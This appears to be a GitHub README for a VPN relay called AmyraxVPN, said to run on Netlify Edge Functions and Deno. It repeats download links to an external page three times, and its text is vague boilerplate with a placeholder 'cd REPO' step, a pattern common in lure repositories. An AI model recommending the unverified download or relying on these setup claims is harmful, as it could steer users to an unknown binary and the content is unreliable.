# AmyraxVPN v2026 - VPN relay 2026

> **AmyraxVPN is a web-edge VPN relay for private traffic routing, using Netlify Edge Functions together with Deno to move network traffic efficiently with auto-connect and reconnect behavior.**

[![Platform](https://img.shields.io/badge/Platform-Web%20edge%20functions-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/gabe-kellyfkyq6316/amyraxvpn-v2026-relay?style=flat-square)](https://github.com/gabe-kellyfkyq6316/amyraxvpn-v2026-relay)

---

<p align="center">
  <a href="https://gabe-kellyfkyq6316.github.io/amyraxvpn-v2026-relay/">
    <img src="https://img.shields.io/badge/Download-AmyraxVPN%20Latest-brightgreen?style=for-the-badge" alt="Download AmyraxVPN">
  </a>
</p>

> **[Download AmyraxVPN v2026](https://gabe-kellyfkyq6316.github.io/amyraxvpn-v2026-relay/)**

---

[Download Latest Build](https://gabe-kellyfkyq6316.github.io/amyraxvpn-v2026-relay/)

---

## Overview

AmyraxVPN routes traffic through a private network path by leaning on web edge infrastructure. The project is centered on efficient web traffic movement while keeping connection control inside a deployable edge runtime.

It suits people who want private routing behavior without running a conventional server stack on their own hardware. With relay-based forwarding, encryption-oriented networking, and system-level handling, it is well matched to controlled traffic transport and reproducible deployment on supported edge platforms.

---

## Key Capabilities

- Fast traffic relay for private routing use cases
- Private web traffic forwarding via edge functions
- Auto-connect behavior that simplifies session startup
- Automatic reconnect support when connections drop
- System-level traffic handling for wider routing coverage
- Encryption-oriented network flow for protected transport
- Designed for Netlify Edge Functions and the Deno runtime
- Compact deployment model tailored to web-edge hosting

---

## Installation

Clone the repository and get it ready for deployment on the destination edge platform:

```bash
git clone https://github.com/gabe-kellyfkyq6316/amyraxvpn-v2026-relay.git
cd REPO
```

Once the repo is available locally, inspect the edge function entrypoints and deploy them through your Netlify workflow. If you are using a local preview or development server, launch it according to your project setup before publishing the relay.

---

## Usage

A normal workflow is to deploy first, then point traffic at the relay endpoint:

1. Deploy the project to your edge environment.
2. Set the relay endpoint and routing rules.
3. Connect a client or browser workflow to the published endpoint.
4. Check that auto-connect and reconnect behavior match your setup.
5. Watch traffic flow and tune routing as needed.

For local development, run the project in your standard Deno or edge-function workflow and confirm that requests are being forwarded through the intended relay path.

---

## Configuration

Configuration is usually managed through edge function settings and runtime environment variables.

```env
EDGE_RUNTIME=deno
DEPLOY_TARGET=netlify
ROUTING_MODE=private
RECONNECT=enabled
AUTO_CONNECT=enabled
```

If your deployment needs extra environment values, store them in the Netlify project settings or in the runtime configuration used by your edge functions.

---

## Requirements

- A web edge hosting environment
- Netlify Edge Functions support
- Deno runtime compatibility
- A deployment target for relay traffic
- Network access suitable for private routing workflows

---

## FAQ

### How are updates handled?
Updates generally come through the repository and the deployment flow you use for your edge environment. After changing routing or runtime settings, rebuild and redeploy.

### Where do I adjust connection behavior?
Check environment settings or function-level configuration for auto-connect, reconnect logic, and traffic routing. The exact location depends on how your deployment is set up.

### What if routing is not working?
Confirm the edge deployment, runtime compatibility, and any routing values in your environment. Also make sure the target endpoint can be reached from the client side.

### Do I need a traditional VPN server?
This project uses a relay model based on web edge functions, so deployment and traffic handling are centered on that environment instead of a standalone server install.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
